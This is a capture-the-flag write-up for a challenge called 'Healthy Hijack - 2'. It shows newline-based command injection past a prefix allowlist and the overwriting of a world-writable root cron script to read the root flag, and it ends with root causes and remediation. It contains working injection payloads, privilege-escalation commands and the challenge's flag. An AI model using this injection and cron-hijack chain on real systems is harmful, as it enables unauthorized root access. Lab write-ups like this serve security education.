# Healthy Hijack - 2 Write-up

## Challenge Information

- **Challenge:** Healthy Hijack - 2
- **Category:** Command injection / cron job hijacking
- **Objective:** Escalate from `appuser` to root and recover the root flag.

## Important Instance Difference

This challenge uses a separate target instance from Healthy Hijack - 1. The flag from the first instance must not be reused.

## 1. Command Injection

The application accepts commands beginning with `ping`, `traceroute`, or `nslookup`. It checks only the command prefix and executes the result with a shell. The sanitizer removes several metacharacters, but does not remove newlines.

The following structure passes the allowlist and executes additional commands:

```text
nslookup __ >/dev/null 2>/dev/null
( id ) >/tmp/_o 2>/tmp/_e
cat /tmp/_o
cat /tmp/_e
```

The response confirms execution as the unprivileged service account:

```text
uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
```

The parentheses and temporary files are useful because they isolate the injected command and return both standard output and standard error.

## 2. Discovering the Root Cron Job

Enumeration shows that `/opt/healthcheck.sh` is world-writable:

```text
chmod 777 /opt/healthcheck.sh
```

The script is executed by root through `/etc/crontab`. It runs at second zero and is also scheduled after the short sleep intervals:

```text
sleep 10
sleep 20
sleep 30
sleep 40
sleep 50
```

The additional cleanup job removes SUID files from `/tmp`, but it does not remove an ordinary mode-0644 file. Therefore, copying the flag to `/tmp/rootflag.txt` is reliable.

## 3. Hijacking the Health Check

The writable script is replaced line by line through command injection:

```text
#!/bin/sh
cp /root/root.txt /tmp/rootflag.txt
chmod 644 /tmp/rootflag.txt
```

The commands used to write it are equivalent to:

```text
echo '#!/bin/sh' > /opt/healthcheck.sh
echo 'cp /root/root.txt /tmp/rootflag.txt' >> /opt/healthcheck.sh
echo 'chmod 644 /tmp/rootflag.txt' >> /opt/healthcheck.sh
```

When cron next executes the script as root, it copies the mode-0600 root flag into a readable temporary file.

## 4. Recovering the Root Flag

Poll the temporary file until the root cron job has executed:

```text
cat /tmp/rootflag.txt
```

The verified root flag for Healthy Hijack - 2 is:

```text
KPMG_CTF{q03a4OxG9_935IaRdz6pbmvezyD4IMZalQtwfdkNyJo}
```

## Exploit Chain

1. Abuse the missing newline check in the command sanitizer.
2. Execute arbitrary shell commands as `appuser`.
3. Enumerate scheduled tasks and writable files.
4. Find the root-executed, world-writable `/opt/healthcheck.sh`.
5. Replace it with a script that copies `/root/root.txt`.
6. Wait for cron to execute the modified script.
7. Read `/tmp/rootflag.txt`.

## Root Causes

The challenge combines two vulnerabilities:

1. **Command injection:** user input is executed with `shell=True`, and newline characters bypass the blacklist.
2. **Writable root cron script:** an unprivileged user can modify a script executed by root.

## Remediation

- Avoid `shell=True` for user-controlled input.
- Use an argument list with `shell=False`.
- Validate the complete command and every argument, rather than checking a prefix.
- Do not use a blacklist as a command-injection defense.
- Make root-owned scheduled scripts non-writable by unprivileged users:

  ```text
  chown root:root /opt/healthcheck.sh
  chmod 755 /opt/healthcheck.sh
  ```

- Review cron configuration and remove unnecessary periodic root jobs.
- Store secrets and flags with permissions that prevent unintended disclosure.
